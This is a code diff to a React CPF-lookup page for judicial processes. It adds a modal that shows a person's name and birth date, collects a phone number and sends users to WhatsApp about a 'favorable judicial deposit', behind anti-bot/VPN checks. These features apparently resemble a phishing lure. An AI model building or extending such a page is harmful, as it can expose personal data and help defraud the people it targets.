@@ -423,7 +423,156 @@ function ProsseguimentoModal({ processo, cpf, onClose, onSent }) {
   )
 }
 
-function SearchScreen({ onSearch, loading, error }) {
+function NaoEncontradoModal({ cpf, dadosPessoais, onClose }) {
+  const [telefone, setTelefone] = useState('')
+  const [sending, setSending] = useState(false)
+  const [sent, setSent] = useState(false)
+  const [config, setConfig] = useState({ whatsapp_numero: '5511999999999', whatsapp_mensagem_nao_encontrado: '' })
+
+  useEffect(() => {
+    fetch('/api/configuracoes').then(r => r.json()).then(setConfig).catch(() => {})
+  }, [])
+
+  const nome = dadosPessoais?.NOME || 'Não identificado'
+  const dataNasc = dadosPessoais?.NASC ? formatDate(dadosPessoais.NASC) : 'Não informada'
+
+  function buildWhatsAppUrl() {
+    let msg = config.whatsapp_mensagem_nao_encontrado ||
+      'Olá, meu nome é {nome}, CPF {cpf}, nascido em {data_nascimento}.\n\nO sistema não conseguiu encontrar meu processo! Gostaria de saber mais detalhes para que eu consiga fazer o cadastramento para meu depósito judicial favorável.'
+    msg = msg
+      .replace(/{nome}/g, nome)
+      .replace(/{cpf}/g, cpf)
+      .replace(/{data_nascimento}/g, dataNasc)
+      .replace(/{telefone}/g, telefone)
+    return `https://wa.me/${config.whatsapp_numero}?text=${encodeURIComponent(msg)}`
+  }
+
+  async function handleSubmit(e) {
+    e.preventDefault()
+    if (!telefone || telefone.replace(/\D/g, '').length < 10) return
+
+    setSending(true)
+    try {
+      await fetch('/api/contato', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          nome,
+          cpf: cpf.replace(/\D/g, ''),
+          telefone,
+          data_nascimento: dataNasc
+        })
+      })
+      setSent(true)
+    } catch {
+      alert('Erro ao enviar. Tente novamente.')
+    } finally {
+      setSending(false)
+    }
+  }
+
+  if (sent) {
+    return (
+      <div className="fixed inset-0 z-50 flex items-start sm:items-center justify-center p-4 pt-20 sm:pt-4 bg-black/50 animate-fadeIn overflow-y-auto">
+        <div className="bg-white rounded-2xl w-full max-w-sm p-8 text-center animate-slideUp shadow-xl mb-10">
+          <div className="w-16 h-16 mx-auto mb-5 bg-emerald-50 rounded-full flex items-center justify-center animate-scaleIn">
+            <CheckCircle className="w-8 h-8 text-emerald-500" />
+          </div>
+          <h3 className="text-xl font-semibold text-gray-900 mb-2">Contato registrado!</h3>
+          <p className="text-sm text-gray-500 mb-2">Seus dados foram recebidos com sucesso.</p>
+          <p className="text-sm text-gray-600 mb-6">Para dar continuidade, entre em contato pelo <span className="font-semibold text-[#25D366]">WhatsApp oficial</span>.</p>
+          <a href={buildWhatsAppUrl()} target="_blank" rel="noopener noreferrer"
+            className="flex items-center justify-center gap-2 w-full py-3.5 bg-[#25D366] hover:bg-[#1da851] text-white rounded-xl font-semibold transition-all hover:scale-[1.02] active:scale-[0.98]">
+            <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>
+            Abrir WhatsApp
+          </a>
+          <button onClick={onClose} className="mt-4 text-sm text-gray-400 hover:text-gray-600 transition-colors">Fechar</button>
+        </div>
+      </div>
+    )
+  }
+
+  return (
+    <div className="fixed inset-0 z-50 flex items-start sm:items-center justify-center bg-black/50 animate-fadeIn overflow-y-auto">
+      <div className="bg-white sm:rounded-2xl w-full max-w-md overflow-hidden shadow-xl animate-slideUp min-h-screen sm:min-h-0 sm:my-4 sm:mx-4">
+        {/* Header */}
+        <div className="bg-gradient-to-r from-[#2364af] to-[#1a4f8f] px-6 py-5 text-white sticky top-0 z-10">
+          <div className="flex items-center justify-between">
+            <div>
+              <h3 className="font-semibold text-lg">Processo Não Encontrado</h3>
+              <p className="text-white/70 text-sm mt-0.5">Solicitar verificação manual</p>
+            </div>
+            <button onClick={onClose} className="p-2 hover:bg-white/10 rounded-lg transition-colors">
+              <X className="w-5 h-5" />
+            </button>
+          </div>
+        </div>
+
+        <div className="p-6 pb-10">
+          {/* Dados do titular */}
+          <div className="bg-[#e8f0fe] rounded-xl p-4 mb-6">
+            <h4 className="text-xs font-bold text-gray-500 uppercase tracking-wider mb-3">Dados Identificados</h4>
+            <div className="space-y-2">
+              <div className="flex justify-between">
+                <span className="text-sm text-gray-500">Nome:</span>
+                <span className="text-sm font-semibold text-gray-900">{nome}</span>
+              </div>
+              <div className="flex justify-between">
+                <span className="text-sm text-gray-500">CPF:</span>
+                <span className="text-sm font-mono text-gray-900">{cpf}</span>
+              </div>
+              <div className="flex justify-between">
+                <span className="text-sm text-gray-500">Nascimento:</span>
+                <span className="text-sm text-gray-900">{dataNasc}</span>
+              </div>
+            </div>
+          </div>
+
+          {/* Aviso */}
+          <div className="bg-amber-50 border border-amber-200 rounded-xl p-4 mb-6">
+            <p className="text-sm text-amber-800">
+              <strong>Atenção:</strong> Seu CPF não foi localizado em nossa base de processos.
+              Informe seu telefone para que nossa equipe entre em contato e verifique sua situação.
+            </p>
+          </div>
+
+          <form onSubmit={handleSubmit}>
+            <label className="block text-sm font-medium text-gray-700 mb-2">
+              <Phone className="w-4 h-4 inline mr-1.5 text-gray-400" />
+              Telefone para contato
+            </label>
+            <input
+              type="tel"
+              inputMode="tel"
+              required
+              value={telefone}
+              onChange={e => setTelefone(formatPhone(e.target.value))}
+              className="w-full px-4 py-4 border border-gray-200 rounded-xl text-lg focus:border-[#2364af] focus:ring-2 focus:ring-[#2364af]/20 transition-all mb-4"
+              placeholder="(00) 00000-0000"
+              autoFocus
+              autoComplete="tel"
+            />
+
+            <button
+              type="submit"
+              disabled={sending || !telefone || telefone.replace(/\D/g, '').length < 10}
+              className="w-full py-4 bg-[#25D366] hover:bg-[#1da851] disabled:bg-gray-200 disabled:text-gray-400 text-white rounded-xl font-semibold transition-all hover:scale-[1.01] active:scale-[0.99] flex items-center justify-center gap-2"
+            >
+              {sending ? <Loader2 className="w-5 h-5 animate-spin" /> : (
+                <>
+                  <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>
+                  Entrar em Contato
+                </>
+              )}
+            </button>
+          </form>
+        </div>
+      </div>
+    </div>
+  )
+}
+
+function SearchScreen({ onSearch, loading, error, showNaoEncontrado, naoEncontradoData, onCloseNaoEncontrado }) {
   const [cpf, setCpf] = useState('')
   const [localError, setLocalError] = useState('')
   const [showInfo, setShowInfo] = useState(true)
@@ -445,6 +594,14 @@ function SearchScreen({ onSearch, loading, error }) {
 
   return (
     <div className="min-h-screen bg-[#f0f4f8] animate-fadeIn">
+      {showNaoEncontrado && naoEncontradoData && (
+        <NaoEncontradoModal
+          cpf={naoEncontradoData.cpf}
+          dadosPessoais={naoEncontradoData.dadosPessoais}
+          onClose={onCloseNaoEncontrado}
+        />
+      )}
+
       {/* Header */}
       <header className="bg-white border-b border-gray-200">
         <div className="max-w-5xl mx-auto px-4 py-3 flex items-center justify-between">
@@ -844,6 +1001,8 @@ export default function ConsultaPage() {
   const [error, setError] = useState('')
   const [pendingData, setPendingData] = useState(null)
   const [accessInfo, setAccessInfo] = useState(null)
+  const [showNaoEncontrado, setShowNaoEncontrado] = useState(false)
+  const [naoEncontradoData, setNaoEncontradoData] = useState(null)
 
   // Verificar proteção anti-bot/VPN no carregamento
   useEffect(() => {
@@ -912,7 +1071,9 @@ export default function ConsultaPage() {
       if (!res.ok) {
         setLoading(false)
         if (res.status === 404) {
-          setError('Nenhum processo encontrado para este CPF')
+          const errorData = await res.json()
+          setNaoEncontradoData({ cpf: cpfValue, dadosPessoais: errorData.dadosPessoais })
+          setShowNaoEncontrado(true)
         } else {
           setError('Erro ao consultar. Tente novamente.')
         }
@@ -952,5 +1113,17 @@ export default function ConsultaPage() {
     return <ResultScreen processos={processos} cpf={cpf} dadosPessoais={dadosPessoais} onBack={handleBack} />
   }
 
-  return <SearchScreen onSearch={handleSearch} loading={loading} error={error} />
+  return (
+    <SearchScreen
+      onSearch={handleSearch}
+      loading={loading}
+      error={error}
+      showNaoEncontrado={showNaoEncontrado}
+      naoEncontradoData={naoEncontradoData}
+      onCloseNaoEncontrado={() => {
+        setShowNaoEncontrado(false)
+        setNaoEncontradoData(null)
+      }}
+    />
+  )
 }
